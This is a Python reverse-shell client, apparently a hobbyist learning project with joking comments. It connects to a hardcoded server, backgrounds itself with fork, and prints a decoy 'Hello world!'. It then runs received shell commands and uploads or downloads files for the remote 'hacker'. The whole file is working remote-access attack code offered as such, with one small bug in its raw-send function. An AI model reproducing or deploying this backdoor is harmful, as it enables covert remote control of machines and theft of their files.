# import the stuffs needed

# sockets for connections
from socket import socket, AF_INET, SOCK_STREAM
# this for getting command output, i still don't know what PIPE means
from subprocess import Popen, PIPE
# when it gets tired (to pause the program)
from time import sleep
# exiting smooothly
from sys import exit
# changing directory, forking off a process and getting current working directory
from os import chdir, fork, getcwd

# define a wait time for SMOOTHN- (im not doing this again i promise)
WAIT_TIME = 0.05

# im not doing this again :sob:
# just check the server file they have the same functions
# ill overview it

# function for receiving raw data (such as raw bytes)
def receive_raw(server_socket: socket) -> bytes:
        length = server_socket.recv(1024).decode()
        sleep(WAIT_TIME)
        raw_data = server_socket.recv(int(length))
        return(raw_data)

# function for sending raw data (such as raw bytes)
def send_raw(server_socket: socket, raw_data: bytes) -> None:
        length = str(len(data))
        server_socket.send(length.encode())
        sleep(WAIT_TIME)
        server_socket.send(raw_data)

# function for receiving normal data (commands and other stuffs)
def receive_data(server_socket: socket) -> str:
        length = server_socket.recv(1024).decode()
        sleep(WAIT_TIME)
        data = server_socket.recv(int(length)).decode()
        return(data)

# functions for sending normal data (outputs and other stuffs)
def send_data(server_socket: socket, data: str) -> None:
        length = str(len(data))
        server_socket.send(length.encode())
        sleep(WAIT_TIME)
        server_socket.send(data.encode())

# im so glad i didn't comment that like the other one
# i hope i never see the word 'smoothness' ever again :sob:

# function for generally handling the connection!
def handle_connection(shell_socket: socket):
        # try to-
        try:
                # INFINITY AND BEY- infinite loop
                while(True):
                        # i literally don't know why this is here but it works so meh
                        sleep(0.001)
                        # define a list for a full command (the most broken way to fix my problem)
                        full_command = []

                        # receive a command!! Gotta love a good command
                        command = receive_data(shell_socket)

                        # for each argument in that command!
                        for arg in command.split():
                                # add it to that list!
                                full_command.append(arg)

                        # if it wants to change the directory
                        if(full_command[0] == "cd"):
                                # try to-
                                try:
                                        # get the new directory from the command
                                        new_dir = full_command[1]
                                        # change to it
                                        chdir(new_dir)
                                        # send over the new current working directory! for the prompt! (its a nice prompt-)
                                        send_data(shell_socket, getcwd())
                                        # continue the infinite loop
                                        continue;

                                # if something goes wrong :rolling_eyes:
                                except Exception as e:
                                        # send over the error (could be more specific, but im lazy)
                                        send_data(shell_socket, "[-] Error: {}".format(e))
                                        # continue da loop
                                        continue;

                        # if the sneaky hacker wants to upload something
                        elif(full_command[0] == "upload"):
                                # get the filename from the spooky hacker
                                filename = receive_data(shell_socket)
                                # also the bytes of the file
                                file_bytes = receive_raw(shell_socket)

                                # TRY TO-
                                try:
                                        # open the file, writing bytes to it
                                        file = open(filename, "wb")
                                        # write the bytes that we got from the scary hacker
                                        file.write(file_bytes)
                                        # close it
                                        file.close()
                                        # send over a success message!!! Yay!!
                                        send_data(shell_socket, "[+] Successfully uploaded {} ^^".format(filename))
                                        # conTINUE THE LOOP
                                        continue;

                                # if something goes horribly wrong and everything breaks and its all your fault
                                except Exception as e:
                                        # send over the error (again, lazy)
                                        send_data(shell_socket, "[-] Error uploading file: {} :(".format(e))
                                        # CONTINUE THE-
                                        continue;

                        # if they want to download something
                        elif(full_command[0] == "download"):
                                # get the filename from the command
                                filename = full_command[1]

                                # JUST TRY
                                try:
                                        # open the file, this time reading da bytes
                                        file = open(filename, "rb")
                                        # read 'em
                                        contents = file.read()
                                        # close
                                        file.close()

                                        # send over a success message!! we did it!! yay!! helping the hacker :sunglasses:
                                        send_data(shell_socket, "[+] Successfully downloaded {} ^^".format(filename))
                                        # also send the contents over, that's important i think
                                        send_raw(shell_socket, contents)

                                # IF SOMETHING SCREWS UP JEEZ YOU'RE SO DUMB HOW DARE YOU MESS UP
                                except Exception as e:
                                        # send the error (lazy-)
                                        send_data(shell_socket, "[-] Erorr while download file: {} :(".format(e))

                                # ... you know the drill
                                continue;

                        # JUST KEEP TRYING
                        try:
                                # get the output of the command, piping (?) out the stdout and stderr
                                # then calling the communicate() method
                                output = Popen(full_command, stdout=PIPE, stderr=PIPE).communicate()
                                # concatenating the two things because i need 'em both i think
                                output = (output[0] + output[1]).decode()

                                # send over the output to the hackerman
                                send_data(shell_socket, output)

                        # BEING MORE SPECIFIC THIS TIME!! CONGRATULATE ME!!

                        # if it can't find the file (command just wrong)
                        except FileNotFoundError:
                                # send over the error and hurt the hacker's ego
                                send_data(shell_socket, "[-] Command not found")

                        # if something else goes wrong (i really couldn't think shush)
                        except Exception as e:
                                # send over the error (you know what im going to say)
                                send_data(shell_socket, "[-] Error: {}".format(e))

        # if something happens when you're doing all that just forget about it and stop running it
        except Exception:
                return;

# JUST KEEP TRYING COME ON YOU'RE NEARLY THERE
try:
        # print 'Hello world!', very innocent
        print("Hello world!")
        # define the server address to connect to
        SERVER_ADDRESS = ("127.0.0.1", 1234)
        # create a socket object and connect ot the address defined above
        shell_socket = socket(AF_INET, SOCK_STREAM)
        shell_socket.connect(SERVER_ADDRESS)
        # send over the current working directory to start it off (COME ON THE PROMPT IS COOL)
        send_data(shell_socket, getcwd())

        # fork the process to background it (i know nothing about this or processes it just works so i guess im smart now)
        if(fork() == 0):
                # handle the connection with the socket
                handle_connection(shell_socket)

# if anything bad happens because you messed up during THAT
except Exception as e:
        # just exit it and call it a day, you're doing great
        exit()